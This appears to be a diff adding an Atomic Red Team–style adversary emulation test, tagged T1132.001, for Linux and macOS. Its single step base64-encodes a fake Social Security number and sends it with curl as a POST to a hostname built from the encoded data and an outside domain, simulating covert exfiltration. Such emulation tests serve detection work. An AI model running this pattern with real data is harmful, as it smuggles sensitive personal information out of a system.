@@ -1,0 +1,38 @@
+{
+  "id": "1164f70f-9a88-4dff-b9ff-dc70e7bf0c25",
+  "name": "Base64 Encoded data.",
+  "description": "Utilizing a common technique for posting base64 encoded data.\n",
+  "platforms": [
+    "darwin",
+    "linux"
+  ],
+  "steps": [
+    {
+      "id": "3417f1d4-76c1-4585-bb54-3f925132351e",
+      "type": "execute-command",
+      "data": {
+        "command": "echo -n 111-11-1111 | base64\ncurl -XPOST #{base64_data}.#{destination_url}\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1132.001",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "destination_url",
+      "type": "url",
+      "description": "Destination URL to post encoded data.",
+      "value": "redcanary.com"
+    },
+    {
+      "name": "base64_data",
+      "type": "string",
+      "description": "Encoded data to post using fake Social Security number 111-11-1111.",
+      "value": "MTExLTExLTExMTE="
+    }
+  ]
+}
